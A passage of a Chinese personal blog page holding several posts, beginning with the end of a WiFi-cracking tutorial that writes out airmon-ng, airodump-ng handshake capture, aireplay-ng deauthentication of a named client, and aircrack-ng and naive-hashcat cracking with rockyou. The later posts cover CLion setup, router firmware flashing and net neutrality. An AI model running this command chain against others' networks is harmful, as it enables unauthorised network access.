+<h3 id="使用naive-hashcat破解"><a href="#使用naive-hashcat破解" class="headerlink" title="使用naive-hashcat破解"></a>使用naive-hashcat破解</h3><p>在使用naive-hashcat破解之前，我们需要先把.cap 文件转换成.hccapx.，可以使用在线转换<a target="_blank" rel="noopener" href="https://hashcat.net/cap2hccapx/">https://hashcat.net/cap2hccapx/</a>或者使用本地工具，这里就用本地工具啦</p>
+<p>git clone <a target="_blank" rel="noopener" href="https://github.com/hashcat/hashcat-utils">https://github.com/hashcat/hashcat-utils</a><br>cd hashcat-utils&#x2F;src &amp;&amp; make<br>.&#x2F;cap2hccapx.bin ~&#x2F;test.cap ~&#x2F;test.hccapx</p>
+<p><img src="/images/072617_0104_WiFi9.png"></p>
+<p>之后下载<code>naïve-hashcat</code>破解</p>
+<p>git clone <a target="_blank" rel="noopener" href="https://github.com/brannondorsey/naive-hashcat">https://github.com/brannondorsey/naive-hashcat</a><br>cd naive-hashcat<br>curl -L -o dicts&#x2F;rockyou.txt <a target="_blank" rel="noopener" href="https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt">https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt</a><br>HASH_FILE&#x3D;test.hccapx POT_FILE&#x3D;test.txt HASH_TYPE&#x3D;2500 .&#x2F;naive-hashcat.sh</p>
+<p><code>HASH_FILE</code>是转换之后的文件名，<code>POT_FILE</code>是最后用来保存结果的文件名 我猜你一定会报错的，大概是这样</p>
+<p><img src="/images/072617_0104_WiFi10.png"></p>
+<p>说了这东西用GPU破解的，自然的嘛…</p>
+<p>如果你的英伟达显卡的话：</p>
+<p>apt install libhwloc-dev ocl-icd-dev ocl-icd-opencl-dev pocl-opencl-icd nvidia-opencl-icd libxnvctrl-dev nvidia-opencl-dev libgmp3-dev libgmp10-doc opencl-headers</p>
+<p>然后重启，之后再运行：</p>
+<p>HASH_FILE&#x3D;test.hccapx POT_FILE&#x3D;test.txt HASH_TYPE&#x3D;2500 .&#x2F;naive-hashcat.sh</p>
+<p>如果破解出密码了，程序就会退出，之后看那个<code>text.txt</code>最后一个字段就是密码</p>
+<p><img src="/images/072617_0104_WiFi11.png"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>下面是一些常用命令的总结</p>
+<p># 进入监听模式<br>airmon-ng start wlan0</p>
+<h1 id="监听"><a href="#监听" class="headerlink" title="监听"></a>监听</h1><p>airodump-ng mon0</p>
+<h1 id="抓握手包"><a href="#抓握手包" class="headerlink" title="抓握手包"></a>抓握手包</h1><p>airodump-ng -c 6 –bssid 9C:5C:8E:C9:AB:C0 -w capture&#x2F; mon0</p>
+<h1 id="deauth"><a href="#deauth" class="headerlink" title="deauth"></a>deauth</h1><p>aireplay-ng -0 10 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0</p>
+<p>########## aircrack-ng破解密码 #########</p>
+<h1 id="如有需要，下载字典"><a href="#如有需要，下载字典" class="headerlink" title="如有需要，下载字典"></a>如有需要，下载字典</h1><p>curl -L -o rockyou.txt <a target="_blank" rel="noopener" href="https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt">https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt</a></p>
+<h1 id="使用aircrack-ng"><a href="#使用aircrack-ng" class="headerlink" title="使用aircrack-ng"></a>使用aircrack-ng</h1><p>aircrack-ng -a2 -b 9C:5C:8E:C9:AB:C0 -w rockyou.txt capture&#x2F;-01.cap</p>
+<p>########## naive-hashcat 破解密码##########</p>
+<h1 id="将-cap-文件转换成-hccapx"><a href="#将-cap-文件转换成-hccapx" class="headerlink" title="将 cap 文件转换成 hccapx"></a>将 cap 文件转换成 hccapx</h1><p>cap2hccapx.bin capture&#x2F;-01.cap capture&#x2F;-01.hccapx</p>
+<h1 id="用-naive-hashcat破解"><a href="#用-naive-hashcat破解" class="headerlink" title="用 naive-hashcat破解"></a>用 naive-hashcat破解</h1><p>HASH_FILE&#x3D;hackme.hccapx POT_FILE&#x3D;hackme.pot HASH_TYPE&#x3D;2500 .&#x2F;naive-hashcat.sh</p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a target="_blank" rel="noopener" href="http://www.aircrack-ng.org/doku.php?id=airmon-ng">http://www.aircrack-ng.org/doku.php?id=airmon-ng</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/brannondorsey/wifi-cracking">https://github.com/brannondorsey/wifi-cracking</a></p>
+<h2 id="最后的感想"><a href="#最后的感想" class="headerlink" title="最后的感想"></a>最后的感想</h2><p>好吧，被人抓到握手包是必然的，deauth也是必然的；如果不想被别人破了自家WiFi，那就设置个比较复杂的密码吧，这样暴力破解时间就会指数级上升，很多人就知难而退了。 哎，弱口令真是最大的弱点啊！</p>
+<h2 id="备注与更新"><a href="#备注与更新" class="headerlink" title="备注与更新"></a>备注与更新</h2><p>macOS自带诊断工具可以做到抓握手包，具体可以参考GitHub的地址</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2017/07/26/wifi-cracking/index/" data-id="clhp6he3p00bdezqr7icuc2xu" data-title="小土豆手把手教你破WiFi" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-clion-and-myself/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2017/07/23/clion-and-myself/index/" class="article-date">
+  <time class="dt-published" datetime="2017-07-23T00:00:00.000Z" itemprop="datePublished">2017-07-23</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/justsay/">justsay</a>►<a class="article-category-link" href="/categories/justsay/program/">program</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2017/07/23/clion-and-myself/index/">要不我们试试Windows下用CLion+Cygwin，顺便谈谈近态</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="为啥不用宇宙第一IDE-Visual-Studio"><a href="#为啥不用宇宙第一IDE-Visual-Studio" class="headerlink" title="为啥不用宇宙第一IDE Visual Studio"></a>为啥不用宇宙第一IDE Visual Studio</h2><p>太大，太大，我只要个VB结果全给我装上了，哈哈</p>
+<h2 id="为啥要在Windows下用CLion"><a href="#为啥要在Windows下用CLion" class="headerlink" title="为啥要在Windows下用CLion"></a>为啥要在Windows下用CLion</h2><p>20多存的显示器大，显示效果出众，可以设置20号字爽翻天…家里电脑没装Linux</p>
+<h2 id="为啥要写这么一篇"><a href="#为啥要写这么一篇" class="headerlink" title="为啥要写这么一篇"></a>为啥要写这么一篇</h2><p>为了水一贴，创造出我高产的假象</p>
+<h2 id="安装CLion"><a href="#安装CLion" class="headerlink" title="安装CLion"></a>安装CLion</h2><p>这就不用说了，去官网下载，安装，下一步等等等等。</p>
+<p>友情提示，有edu邮箱的童鞋要记得申请免费试用一年的优惠哦！</p>
+<h2 id="下载cygwin"><a href="#下载cygwin" class="headerlink" title="下载cygwin"></a>下载cygwin</h2><p><a target="_blank" rel="noopener" href="https://cygwin.com/setup-x86/_64.exe">https://cygwin.com/setup-x86\_64.exe</a></p>
+<p>目录就默认<code>C:\cygwin64</code>就可以，mirror添加个国内的源吧，<a target="_blank" rel="noopener" href="http://mirrors.sohu.com/cygwin/%EF%BC%8C%E6%88%96%E8%80%85%E9%98%BF%E9%87%8C%E4%BA%91https://mirrors.aliyun.com/cygwin/">http://mirrors.sohu.com/cygwin/，或者阿里云https://mirrors.aliyun.com/cygwin/</a> :!:</p>
+<p><img src="/images/072217_1339_Windows1.png"></p>
+<p> </p>
+<p>左上角依次搜索<code>make gcc gdb</code>，确保选中的是如图三个软件包就可以了：</p>
+<p><img src="/images/072217_1339_Windows2.jpg"></p>
+<p>下一步等安装吧…</p>
+<p>设置CLion</p>
+<p>打开CLion的设置</p>
+<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/07/072217_1339_Windows3.png"><img src="/images/072217_1339_Windows3.png"></a></p>
+<p>如图所示选择，就都绿啦！</p>
+<h2 id="写个Hello-World瞧瞧"><a href="#写个Hello-World瞧瞧" class="headerlink" title="写个Hello World瞧瞧"></a>写个Hello World瞧瞧</h2><p>一直在<code>build symbols</code>好慢TAT，20号字就是看着清楚！</p>
+<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/07/072217_1339_Windows4.png"><img src="/images/072217_1339_Windows4.png"></a></p>
+<h2 id="又水了一贴-sad"><a href="#又水了一贴-sad" class="headerlink" title="又水了一贴 :sad:"></a>又水了一贴 :sad:</h2><p>那么，最近在干什么，未来的一段时间有什么计划呢？</p>
+<h2 id="开发-x2F-维护两款主题"><a href="#开发-x2F-维护两款主题" class="headerlink" title="开发&#x2F;维护两款主题"></a>开发&#x2F;维护两款主题</h2><p>准确的说是维护，在前人们的基础上进行小修小补增加功能。一款是Typecho的主题<a target="_blank" rel="noopener" href="https://github.com/BennyThink/GreenGrapes2">GreenGrapes2</a>，一款是我自己在用的WordPress主题<a target="_blank" rel="noopener" href="https://github.com/BennyThink/WordPressGit">WordPressGit</a></p>
+<p>顺带着开发了能够在指定日期把网站变成黑白的纪念日插件<a target="_blank" rel="noopener" href="https://github.com/BennyThink/MemorialDay">MemorialDay</a>，支持WordPress和Typecho，WordPress版本的可以在<a target="_blank" rel="noopener" href="https://wordpress.org/plugins/memorial-day/">官方插件库</a>里搜索到</p>
+<p>莫非我真的要成为PHP程序员了？你看见那个黑人了吗，他上午还是个白人来着。</p>
+<h2 id="实习生"><a href="#实习生" class="headerlink" title="实习生"></a>实习生</h2><p>我记得在《少有人走的路》中文版序有句话是这么说的：</p>
+<blockquote>
+<p>十七八岁的高中生在大街上堂而皇之地用奶瓶喝水。——这是时髦、反叛，还是在逃避成熟？ 应届大学毕业生选择考研的动机仅仅是：害怕毕业。——他们是害怕毕业，还是在拒绝成熟？ 无数大龄青年不愿结婚。——他们真的是没选择好伴侣，还是害怕承担婚后的责任？ 数不清的成年人一遇到难题，就双手一摊：“这不是我的问题”——他们果真技不如人，还是不敢面对自己的问题？</p>
+<p><strong>人可以拒绝任何东西，但绝对不可以拒绝成熟。</strong></p>
+</blockquote>
+<p>我记得四年前在我刚刚入学的时候，有些兴奋、期待又担忧，最开始的时候很不适应新生活；这么多年过去了，下一个时间点应该也会这样吧；</p>
+<p>好吧，我还没有准备入职前HR姐姐说的“自学”呢，哎….明知道自己是个渣渣，却还<strong>总</strong>以为自己不可一世，这究竟是一种怎样的心理疾病啊 :sad:</p>
+<h2 id="曾经吵过闹过的那个小伙伴"><a href="#曾经吵过闹过的那个小伙伴" class="headerlink" title="曾经吵过闹过的那个小伙伴"></a>曾经吵过闹过的那个小伙伴</h2><p>今天去给她重装了操作系统，顺便谈了一谈一些我的问题。“此处不留爷，自有留爷处”，怎奈我却还想孤注一掷。然而想想以前的生活，孤注一掷从来没有给我带来什么好处，也许这次也是一样的结果吧，所有的付出都是竹篮打水。let go of it? DAMN IT!!!</p>
+<h2 id="自绝后路之旅，存在理论与堕落之人"><a href="#自绝后路之旅，存在理论与堕落之人" class="headerlink" title="自绝后路之旅，存在理论与堕落之人"></a>自绝后路之旅，存在理论与堕落之人</h2><p>好吧，我承认这两个标题都是我从萌狼那里偷来的，我也不知道是什么意思，就是觉得挺好的，适合瞎说点啥，不明就里，于是就贴到这里。不过其实黄鼠更恰当吧。反正就是搞得自己很清高、心思很重的样子。</p>
+<h2 id="博客两周年"><a href="#博客两周年" class="headerlink" title="博客两周年"></a>博客两周年</h2><p>再有一个月，就要开博两年了。想想非常可笑的事情就是我为了翻墙而买了个VPS，觉得太浪费就搭建了个博客，结果没多久Clowwindy就被请走喝茶了。两周年的时候，也许我会水一贴，说说这两年都有什么见闻，遇到了什么样的人？也许吧，如果那个时候足够无聊的话。</p>
+<h2 id="还有什么计划"><a href="#还有什么计划" class="headerlink" title="还有什么计划"></a>还有什么计划</h2><p>当然是老样子，维护这俩主题（如果有必要的话），更新学习资料的仓库，准备开始独立的新生活，继续做一些安全分析和一些可能的计划与准备工作吧。<strong>可能的任务计划，可能永远不可能</strong>。</p>
+<p>还是别自我伤感了，尽可能的长本事吧，毕竟这才是以后生存下去的资本……</p>
+<h2 id="Stay…"><a href="#Stay…" class="headerlink" title="Stay…"></a>Stay…</h2><p>六年了，每次难过的时候就会单曲循环，不停地来回的听……stay…stay  :???:</p>
+<blockquote>
+<p>这首来自Tonya Mitchell的Stay，是一位朋友微信点播的。他留言说……</p>
+</blockquote>
+<p>Even when we go our separate ways, in my heart you’ll always stay…. [netmusic id&#x3D;”3560431”]</p>
+<p>アイロニ</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2017/07/23/clion-and-myself/index/" data-id="clhp6hdyb000xezqr0ixg22lr" data-title="要不我们试试Windows下用CLion+Cygwin，顺便谈谈近态" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-y1s/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2017/07/21/y1s/index/" class="article-date">
+  <time class="dt-published" datetime="2017-07-21T00:00:00.000Z" itemprop="datePublished">2017-07-21</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/it/">it</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2017/07/21/y1s/index/">体验下大内存的联想y1s路由器吧</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>买了个联想y1s路由器回来玩玩.</p>
+<h2 id="啥，怎么又买路由器了？"><a href="#啥，怎么又买路由器了？" class="headerlink" title="啥，怎么又买路由器了？"></a>啥，怎么又买路由器了？</h2><p>是这样的，今早翻东西找不到了以前的TP路由器，想着十几天之后自己工作了，住处不能没有路由器啊，还不能把家里的路由器拿走（坑爹的斐讯K1），那只好买个新的给自己用啦:-D</p>
+<h2 id="为啥要买这款呐"><a href="#为啥要买这款呐" class="headerlink" title="为啥要买这款呐"></a>为啥要买这款呐</h2><p>其实我搜索综合了很多因素：</p>
+<h3 id="MTK-7620"><a href="#MTK-7620" class="headerlink" title="MTK 7620"></a>MTK 7620</h3><p>首先我需要MTK 7620芯片的路由器，为啥呐？有一款Padavan固件<strong>比较好用</strong>；</p>
+<h3 id="2-4G与5G"><a href="#2-4G与5G" class="headerlink" title="2.4G与5G"></a>2.4G与5G</h3><p>其次我需要支持5G，为啥呐？因为考虑到我住处白领居多可能全都是2.4G的信号，怕是信道被挤爆了那就影响到网络质量了，所以搞个5G的巧妙避开这些（可惜我的笔记本不支持5G但是实在不行有网线啊）；</p>
+<h3 id="USB接口"><a href="#USB接口" class="headerlink" title="USB接口"></a>USB接口</h3><p>再有我需要带USB的……实现我一直以来把路由器当成下载机的梦想啊！</p>
+<p>于是乎，选来选去我就买了”美帝良心想”的这款路由器，<strong>256MB的RAM、16MB的Flash，三个USB</strong>，嗯……256M的大内存哦，是我的翻墙小鸡服务器的四倍哦！</p>
+<p> </p>
+<h2 id="拆箱啦！"><a href="#拆箱啦！" class="headerlink" title="拆箱啦！"></a>拆箱啦！</h2><p><img src="/images/072117_1354_y1s1.png"></p>
+<p>包装盒正面，好古朴的！</p>
+<p><img src="/images/072117_1354_y1s2.png"></p>
+<p>啥？2015年生产的？两年前啦？</p>
+<p><img src="/images/072117_1354_y1s3.png"></p>
+<p>包装还是很简洁的</p>
+<p><img src="/images/072117_1354_y1s4.png"></p>
+<p>一个巨大无比的AC电源适配器，10V2A，毕竟三个USB呢是吧</p>
+<p><img src="/images/072117_1354_y1s5.png"></p>
+<p>来给电！中间蓝色的U还是∩，效果很不错啊，外形比图片好看。</p>
+<h2 id="来瞅瞅官方固件的样子"><a href="#来瞅瞅官方固件的样子" class="headerlink" title="来瞅瞅官方固件的样子"></a>来瞅瞅官方固件的样子</h2><p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/07/072117_1354_y1s6.png"><img src="/images/072117_1354_y1s6.png"></a></p>
+<p>呃这个…要多弱智有多弱智，反正是OpenWRT套了个壳子。</p>
+<p>算了咱们开始刷吧！大概就是参考很久之前的<a target="_blank" rel="noopener" href="https://dmesg.app/psg1208-noads.html">《斐讯PSG1208刷第三方固件、去广告备忘》</a>啦</p>
+<p>咦？咱们以前给Android手机刷机的时候是怎么办的？</p>
+<p>一般来说如果需要解锁就先解锁，然后<strong>刷入一个第三方的recovery</strong>，再<strong>刷入zip格式的卡刷包</strong>，其实路由器也是这个原理的。所以……</p>
+<h2 id="准备工作…"><a href="#准备工作…" class="headerlink" title="准备工作…"></a>准备工作…</h2><p>先下载好Breed和固件，再准备一条网线和电脑</p>
+<h3 id="Breed-bootloader"><a href="#Breed-bootloader" class="headerlink" title="Breed bootloader"></a>Breed bootloader</h3><p><a target="_blank" rel="noopener" href="http://www.right.com.cn/forum/thread-161906-1-1.html">http://www.right.com.cn/forum/thread-161906-1-1.html</a></p>
+<p>搜索下，找y1s的Breed，下载回来，其实就是<a target="_blank" rel="noopener" href="https://breed.hackpascal.net/Breed-mt7620-lenovo-y1s.bin">https://Breed.hackpascal.net/Breed-mt7620-lenovo-y1s.bin</a></p>
+<p> </p>
+<h3 id="Padavan固件"><a href="#Padavan固件" class="headerlink" title="Padavan固件"></a>Padavan固件</h3><p><a target="_blank" rel="noopener" href="http://www.right.com.cn/forum/thread-161324-1-1.html">http://www.right.com.cn/forum/thread-161324-1-1.html</a></p>
+<p>还是继续搜索y1s，在这里我看到有两个，一个是接口反转（LAN1和WAN反转，1Gbps），一个是接口正常（100Mbps）。</p>
+<p>[v_notice]博主知道大家懒，那么就戳下面的链接下载吧[&#x2F;v_notice] [dl href&#x3D;’<a target="_blank" rel="noopener" href="http://bennydownload.file.alimmdn.com/y1s.zip'/]%E6%88%B3%E6%88%B3%E6%88%B3%E4%B8%8D%E5%8A%A8/[/dl/]">http://bennydownload.file.alimmdn.com/y1s.zip&#39;\]戳戳戳不动\[/dl\]</a></p>
+<h3 id="刷Breed"><a href="#刷Breed" class="headerlink" title="刷Breed"></a>刷Breed</h3><p>电脑IP地址设置成<code>192.168.1.2</code>，子网掩码<code>255.255.255.0</code>，网关不用填，用网线连接到路由器的LAN.</p>
+<p>然后路由器断电，按住后面的RST，给电，等待几个指示灯闪烁几次（大概五秒左右），然后松开RST，此时应该已经能够ping通<code>192.168.1.1</code>了，打开浏览器….</p>
+<p>哇！</p>
+<p><img src="/images/072117_1354_y1s7.png"></p>
+<p>这就好像进入了手机的BootLoader一样……</p>
+<p>还等什么，选择<code>Breed-mt7620-lenovo-y1s.bin</code>，刷呀！</p>
+<p><img src="/images/072117_1354_y1s8.png"></p>
+<p>倒计时时间请静静等待…</p>
+<p>倒计时走完之后，我们会异常惊奇的发现，路由器现在的系统还是官方的那个什么小云啊……哎我问你，你给你的手机刷了个第三方recovery，OS还是原来的OS对吧？</p>
+<p>咱再继续按照断电-RST办法再进一次恢复模式，哈哈，就会发现变成这个样子的啦！</p>
+<p><img src="/images/072117_1354_y1s9.png"></p>
+<p>先备份下编程器和EEPROM吧，以防万一！</p>
+<h2 id="刷入Padavan固件"><a href="#刷入Padavan固件" class="headerlink" title="刷入Padavan固件"></a>刷入Padavan固件</h2><p>很简单，就是下图这样子的</p>
+<p><img src="/images/072117_1354_y1s10.png"></p>
+<p>选择你的固件确认刷入，静静等待可以了。</p>
+<p>那么问题来了，咱该选择哪个呢？反转的？100M的？自己看着办吧！</p>
+<p>然后把电脑的IP设置成自动就可以啦！</p>
+<h2 id="Padavan的主界面"><a href="#Padavan的主界面" class="headerlink" title="Padavan的主界面"></a>Padavan的主界面</h2><p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/07/072117_1354_y1s11.jpg"><img src="/images/072117_1354_y1s11.jpg"></a></p>
+<p>大内存就是好…</p>
+<h2 id="中继热点"><a href="#中继热点" class="headerlink" title="中继热点"></a>中继热点</h2><p><img src="/images/072117_1354_y1s12.jpg"></p>
+<p>fork炸弹哟</p>
+<h2 id="Shadowsocks"><a href="#Shadowsocks" class="headerlink" title="Shadowsocks"></a>Shadowsocks</h2><p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/07/072117_1354_y1s13.jpg"><img src="/images/072117_1354_y1s13-401x1024.jpg"></a></p>
+<p>左侧那列输入自己的shadowsocks服务器信息，下面的高级功能按照我的来就可以~然后在家就可以体验墙外一样的感觉啦( ⊙ o ⊙ )</p>
+<h2 id="广告屏蔽"><a href="#广告屏蔽" class="headerlink" title="广告屏蔽"></a>广告屏蔽</h2><p><img src="/images/072117_1354_y1s14.jpg"></p>
+<p>其他的功能……没试。</p>
+<h1 id="对，就是这么又水了一贴……"><a href="#对，就是这么又水了一贴……" class="headerlink" title="对，就是这么又水了一贴……"></a>对，就是这么又水了一贴……</h1>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2017/07/21/y1s/index/" data-id="clhp6he3w00bxezqr9rvm2dc1" data-title="体验下大内存的联想y1s路由器吧" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-net-neutrality/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2017/07/13/net-neutrality/index/" class="article-date">
+  <time class="dt-published" datetime="2017-07-13T00:00:00.000Z" itemprop="datePublished">2017-07-13</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/justsay/">justsay</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2017/07/13/net-neutrality/index/">网络中立性：自由开放的互联网</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>五年前的<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2012/12/wcit-12.html">国际世界电信大会以失败告终</a>，有人说互联网躲过一劫。然而西天取经路上九九八十一难，如果在今天，类似的事情再次发生，你会怎么做？ [v_blue]有人说，这篇文章的风格很土豆（potatoish?我自创的词语），那我只好说，这基本上是翻译啦…… [&#x2F;v_blue] <img src="/images/071317_0102_1.png"></p>
+<h2 id="发生了什么"><a href="#发生了什么" class="headerlink" title="发生了什么"></a>发生了什么</h2><p>美国联邦通信委员会(FCC)投票决定撤销奥巴马政府时代的一项规定，即禁止优先处理或遏制某些数据，即所谓的”网络中立原则”。第一次征求意见于7月12日开始、7月17日结束。</p>
+<h2 id="什么是网络中立性"><a href="#什么是网络中立性" class="headerlink" title="什么是网络中立性"></a>什么是网络中立性</h2><p>网络中立性（Net neutrality），是一种原则，要求<strong>互联网服务供应商及政府应平等处理所有互联网上的资料，</strong>也就是指<strong>所有互联网流量必须得到公平地对待。</strong></p>
+<p>网络中立性是保护我们言论自由的基本原则。通信法第二章提供了网络中立的法律基础，防止互联网服务提供商故意减慢网络速度、屏蔽网站、对应用和网站收取额外费用。</p>
+<h2 id="为什么网络中立性很重要"><a href="#为什么网络中立性很重要" class="headerlink" title="为什么网络中立性很重要"></a>为什么网络中立性很重要</h2><p>互联网正是由于它的中立性才得到今天这般飞速发展。这也是让互联网充满生机、具有创新能力的原因。互联网是一个具有创造力的、支持自由表达、交换观点的地方。没有了网络中立性，互联网就会变成像有线电视一样，你所看到的内容不过是提供商想给你看的内容。</p>
+<h3 id="我们支持网络中立，我们支持言论自由。"><a href="#我们支持网络中立，我们支持言论自由。" class="headerlink" title="我们支持网络中立，我们支持言论自由。"></a>我们支持网络中立，我们支持言论自由。</h3><p>几乎每一个了解、依赖互联网的人都支持网络中立性，无论是创业公司创始人，活动家，游戏玩家，政客，投资人，喜剧演员，YouTube明星，甚至是普通的使用互联网的用户。但是不要想当然。</p>
+<h3 id="他们想结束网络中立，他们想控制、想对互联网征税"><a href="#他们想结束网络中立，他们想控制、想对互联网征税" class="headerlink" title="他们想结束网络中立，他们想控制、想对互联网征税"></a>他们想结束网络中立，他们想控制、想对互联网征税</h3><p>有线电视公司以其高价低质的服务而闻名。现在，他们想游说FCC和国会结束网络中立原则。</p>
+<p>每个网站都将花费更多的金钱来获得更高的带宽。更进一步，这将会对创业公司和独立声音造成打击。如果我们失去了网络中立性，互联网就再也不会是我们所熟知的样子了。</p>
+<h2 id="抗议进行时"><a href="#抗议进行时" class="headerlink" title="抗议进行时"></a>抗议进行时</h2><p>一些非常著名的高科技公司以及组织，都参加了这场抗议活动，包括amazon, netflix, GitHub, <a target="_blank" rel="noopener" href="https://blog.twitter.com/official/en_us/topics/company/2017/Join-the-Fight-for-NetNeutrality.html">Twitter</a>, Mozilla, reddit, Dropbox, linode, namecheap, PornHub甚至是O’REILLY, EFF, FSF <img src="/images/071317_0102_2.png"></p>
+<p>万维网之父蒂姆·伯纳斯·李爵士说：</p>
+<p>[video]<a target="_blank" rel="noopener" href="https://shemissed.me/video/what-kind-of-web.mp4/[/video/]">https://shemissed.me/video/what-kind-of-web.mp4\[/video\]</a></p>
+<h2 id="如果他们赢了，会发生什么"><a href="#如果他们赢了，会发生什么" class="headerlink" title="如果他们赢了，会发生什么"></a>如果他们赢了，会发生什么</h2><p>会像这样（Twitter）</p>
+<p><img src="/images/071317_0102_3.png"></p>
+<p>这样（PornHub）</p>
+<p><img src="/images/071317_0102_4.png"></p>
+<p>这样（Reddit）</p>
+<p><img src="/images/071317_0102_5.png"></p>
+<p>或者这样（Reddit）</p>
+<p><img src="/images/071317_0102_6.jpg"></p>
+<p>也就是：ISP向互联网内容提供商（ICP）收费、制定不同的流量对待策略、屏蔽审查内容，有选择的降低网速、提高费率、进行不透明的审查。</p>
+<p>换句话说，ISP将有权力屏蔽网站、对部分应用和网站降速，甚至是把互联网分成”快车道”和”慢车道”。更重要的是，<strong>互联网将不再是自由与开放的</strong>，那些有钱的公司可以给ISP更多的钱来得到”快车道”，而那些创业公司和非盈利组织则无力承担此类费用，这将会扼杀无数最具有创新力的创业机会。</p>
+<p><a target="_blank" rel="noopener" href="https://www.v2ex.com/t/110500">上海电信精品网</a>掩面哭泣。</p>
+<h2 id="我们能做什么"><a href="#我们能做什么" class="headerlink" title="我们能做什么"></a>我们能做什么</h2><p>就像一个月之前《人们不会忘记》一样，你可以<a target="_blank" rel="noopener" href="https://www.battleforthenet.com/">做出自己的努力，去反对、抗议、宣传</a>；</p>
+<p>就像五年前一样：热爱自由开放的网络？<a target="_blank" rel="noopener" href="https://www.google.com/takeaction/">告诉全世界政府让它保持这种精神</a></p>
+<p>可能有些人觉得，自己只是一介屁民，没啥用？那么，请看一遍下面这首诗：</p>
+<blockquote>
+<p>起初他们追杀共产主义者，我没有说话——因为我不是共产主义者；</p>
+<p>接著他们追杀犹太人，我没有说话——因为我不是犹太人；</p>
+<p>后来他们追杀工会成员，我没有说话——因为我不是工会成员；</p>
+<p>此后他们追杀天主教徒，我没有说话——因为我是新教教徒；</p>
+<p>最后他们奔我而来，却再也没有人站起来为我说话了。</p>
+</blockquote>
+<h2 id="我"><a href="#我" class="headerlink" title="我"></a>我</h2><p>我所追求的一切都起因于这个封闭的”互联网”，都源于这堵可怕的、无形的墙。最开始，我只是把这当作一个普通的政策问题。可是渐渐的随着阅历的增长与思维能力的提升，我意识到，<strong>墙背后的原因要远远比我想象的复杂</strong>，所谓”你不关心政治，政治会来关心你”。我的诉求简单到只想要一个自由的、开放的互联网，然而这是不可能的，你我心知肚明。某童鞋应该十分了解我的这个想法。</p>
+<p>我知道我的声音很微弱，我知道我的影子很渺小，我知道我的人权受到了践踏，我知道我无权对美国国会施压。但是，有一件事情我非常清楚：<strong>我追求自由开放的互联网</strong>，尽管我没有多大的影响力，但是，<strong>自由与开放是这个互联网的本质精神</strong>；我不愿做奴仆。如果你也和我一样热爱自由，热爱互联网，那么请勿忘初心，行动起来，不要停留在这一次的脚步上，请时时刻刻记得，<strong>哪怕你只是教会了身边的朋友翻墙、哪怕你只是吸引他们使用墙外的平台与服务、哪怕你只是告诉了他们学会自由思想。勿以善小而不为。</strong></p>
+<p>为了自由与开放的互联网，你愿意做什么？</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2017/07/13/net-neutrality/index/" data-id="clhp6he0n004vezqrb0uofzwo" data-title="网络中立性：自由开放的互联网" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-1984/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2017/07/01/1984/index/" class="article-date">
+  <time class="dt-published" datetime="2017-07-01T00:00:00.000Z" itemprop="datePublished">2017-07-01</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/china/">china</a>►<a class="article-category-link" href="/categories/china/justsay/">justsay</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2017/07/01/1984/index/">1984：极权的绝佳操作指南</a>
+    </h1>
+  
+
+      </header>
+    
